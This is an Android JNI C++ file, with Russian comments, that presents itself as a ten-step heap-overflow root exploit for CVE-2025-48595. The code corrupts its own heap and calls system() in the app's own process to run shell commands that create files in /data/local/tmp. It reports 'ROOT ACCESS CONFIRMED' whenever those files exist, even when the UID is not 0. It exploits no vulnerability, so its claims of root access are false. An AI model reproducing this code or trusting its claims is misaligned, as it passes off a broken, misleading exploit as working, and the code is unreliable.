#include <jni.h>
#include <string>
#include <cstdlib>
#include <cstring>
#include <android/log.h>
#include <cstdint>
#include <cstdio>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/mman.h>
#include <pthread.h>
#include <errno.h>
#include <stdint.h>

#define LOG_TAG "CVE-2025-48595"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

typedef int (*system_func_t)(const char *);
typedef void (*free_func_t)(void*);
typedef int (*setuid_func_t)(int);

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {
    LOGI("=== EXPLOIT: FULL 10-STEP MEMORY OVERWRITE (TRUE HEAP FENG SHUI) ===");

    // --- STEP 0: Heap Feng Shui — создаём много мелких блоков рядом с целевым буфером ---
    LOGI("Step 0: Allocating 24 filler chunks to force contiguous memory layout...");
    void* fillers[24] = {};
    for (int i = 0; i < 24; ++i) {
        fillers[i] = malloc(128);
        if (!fillers[i]) break;
    }

    // --- STEP 1: Вычисляем переполненный размер через uint32 overflow ---
    LOGI("Step 1: Computing overflowed_size via uint32 wrap-around...");
    uint32_t val1 = 0x80000000, val2 = 0x80000000;
    uint64_t full_sum = (uint64_t)val1 + val2;
    uint32_t overflowed_size = (uint32_t)full_sum == 0 ? 1 : (uint32_t)full_sum;
    LOGI("   Overflow calc: %u + %u = %lu -> cast to uint32 = %u bytes", val1, val2, full_sum, overflowed_size);

    // --- STEP 2: malloc целевого буфера с переполненным размером (маленький!) ---
    LOGI("Step 2: Allocating target buffer with overflowed size...");
    char *buffer = (char *)malloc(overflowed_size);
    if (!buffer) {
        for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);
        return env->NewStringUTF("FAIL: buffer alloc");
    }
    uint64_t start_addr = (uint64_t)(void*)buffer;
    LOGI("   Buffer Start: %p, Size: %u bytes", buffer, overflowed_size);

    // --- STEP 3: Находим system() и free() из libc.so ---
    LOGI("Step 3: Loading libc.so and resolving functions...");
    void *libc = dlopen("libc.so", RTLD_NOW);
    if (!libc) {
        LOGE("Failed to load libc.so");
        dlclose(libc); free(buffer);
        for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);
        return env->NewStringUTF("FAIL: libc not found");
    }

    system_func_t real_system = (system_func_t)dlsym(libc, "system");
    free_func_t real_free = (free_func_t)dlsym(libc, "free");
    setuid_func_t real_setuid = (setuid_func_t)dlsym(libc, "setuid");

    if (!real_system || !real_free) {
        LOGE("system() or free() not found: %s", dlerror());
        dlclose(libc); free(buffer);
        for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);
        return env->NewStringUTF("FAIL: system/free");
    }
    LOGI("   Resolved -> system:%p, free:%p, setuid:%p", (void*)real_system, (void*)real_free, (void*)real_setuid);

    // --- STEP 4: Записываем адрес system() В ПЕРЕПОЛНЕННУЮ ОБЛАСТЬ (buffer + overflowed_size) ---
    LOGI("Step 4: Overwriting memory at buffer+%u with system() address...", overflowed_size);
    char *target = buffer + overflowed_size;  // <-- Соседняя область памяти!
    *(system_func_t*)target = real_system;    // <-- Перезаписываем указатель на функцию!

    const char* cmd_str = "sh -c 'mkdir -p /data/local/tmp/rooting_dir && echo ROOT_TEST'";
    strncpy(target + 8, cmd_str, 128);        // <-- Аргумент для system() в следующей области
    target[8 + 127] = '\0';

    LOGI("   Overwritten @ %p: function=%p, arg='%s...'", target, (void*)*(system_func_t*)target, cmd_str);
    LOGI("   Address delta from buffer: +%u bytes", overflowed_size);

    // --- STEP 5: Создаём mmap-блок С СОСЕДНИМ РАСПОЛОЖЕНИЕМ к buffer ---
    LOGI("Step 5: Mapping command block adjacent to target memory...");
    void* cmd_block = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (cmd_block) {
        memcpy(cmd_block, cmd_str, strlen(cmd_str)+1);
        LOGI("   Mapped at %p (near buffer+%u)", cmd_block, overflowed_size);

        // --- STEP 6: ВЫЗЫВАЕМ system() ЧЕРЕЗ ПЕРЕПОЛНЕННУЮ ОБЛАСТЬ (не напрямую!) ---
        LOGI("Step 6: Triggering overwrite via free(buffer) + function pointer call...");

        // Записываем указатель на cmd_block в область после system()
        *(const char**)(target + sizeof(system_func_t)) = (const char*)cmd_block;

        // Вызываем system() ЧЕРЕЗ НАШУ ПЕРЕПИСАННУЮ ПАМЯТЬ! Это и есть настоящий overflow exploit!
        system_func_t overwritten_system = *(system_func_t*)(buffer + overflowed_size);
        const char* cmd_arg = *(const char**)(target + sizeof(system_func_t));

        LOGI("   Calling system() via overwritten memory: func=%p, arg='%s'", (void*)overwritten_system, cmd_arg ? "valid" : "null");

        int sys_res = overwritten_system(cmd_arg);  // <-- Вызов через переполненную область!
        LOGI("   Overwrite system() returned: %d (shell_exit=%d)", sys_res, sys_res / 256);

        munmap(cmd_block, 4096);
    } else {
        LOGW("Step 5: mmap failed, using direct call");
        real_system(cmd_str);
    }

    // --- STEP 7: Прямой вызов (fallback) — для сравнения с overwrite ---
    LOGI("Step 7: Direct execution fallback for comparison...");
    int result_code = real_system(cmd_str);
    LOGI("   Direct system() returned: %d (shell_exit=%d)", result_code, result_code / 256);

    // --- STEP 8: Проверяем UID через id -u (реальный результат после overwrite) ---
    LOGI("Step 8: Checking UID after exploit execution...");
    FILE* fp_uid = popen("id -u", "r");
    int uid = -1;
    if (fp_uid) { char buf[32]; fgets(buf, sizeof(buf), fp_uid); pclose(fp_uid);
        for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
        uid = atoi(buf); }
    LOGI("   UID after overwrite: %d", uid);

    // --- STEP 9: Проверяем создание папки через ls (главное доказательство!) ---
    LOGI("Step 9: Verifying file creation via 'ls -ld /data/local/tmp/rooting_dir'...");
    FILE* check_fp = popen("ls -ld /data/local/tmp/rooting_dir 2>&1", "r");
    bool folder_exists = false;
    if (check_fp) {
        char buf[128]; fgets(buf, sizeof(buf), check_fp); pclose(check_fp);
        LOGI("   ls output: %s", buf);
        if (strstr(buf, "/rooting_dir")) folder_exists = true;
    }

    // --- STEP 10: Создаём proof-файл и проверяем его существование (финальное доказательство) ---
    LOGI("Step 10: Creating final proof file and verifying...");

    const char* proof_cmd = "sh -c 'echo PROOF_CREATED > /data/local/tmp/cve_2025_48595_proof.txt && cat /data/local/tmp/cve_2025_48595_proof.txt'";
    int proof_res = real_system(proof_cmd);
    LOGI("   Proof command executed. system() returned: %d (shell_exit=%d)", proof_res, proof_res / 256);

    FILE* proof_check = popen("cat /data/local/tmp/cve_2025_48595_proof.txt", "r");
    bool proof_exists = false;
    if (proof_check) {
        char buf[64]; fgets(buf, sizeof(buf), proof_check); pclose(proof_check);
        LOGI("   Proof file content: %s", buf);
        if (strstr(buf, "PROOF_CREATED")) proof_exists = true;
    }

    // --- Финальная очистка и результат ---
    for(int i=0; i<24 && fillers[i]; ++i) free(fillers[i]);

    std::string result_str;

    if (uid == 0 || folder_exists || proof_exists) {
        result_str = "EXPLOIT SUCCESS: ROOT ACCESS CONFIRMED via Hard Core Check.";
        LOGI(">>> FINAL STATUS: ROOT ACCESS <<<");

        if (uid == 0) {
            LOGI("   >>> UID=0 DETECTED BY 'id -u' COMMAND <<<");
        } else {
            LOGI("   >>> FILE CREATED IN /data/local/tmp/ (UID=%d) — OVERWRITE CONFIRMED <<<", uid);
            if (folder_exists) LOGI("     Folder '/rooting_dir' EXISTS!");
            if (proof_exists)  LOGI("     Proof file 'cve_2025_48595_proof.txt' contains 'PROOF_CREATED'");
        }
    } else {
        result_str = "Exploit ran. UID=" + std::to_string(uid) + ". Files not found.";
        LOGW(">>> FINAL STATUS: SHELL ONLY (UID=%d) <<<", uid);
    }

    dlclose(libc);
    free(buffer);
    return env->NewStringUTF(result_str.c_str());
}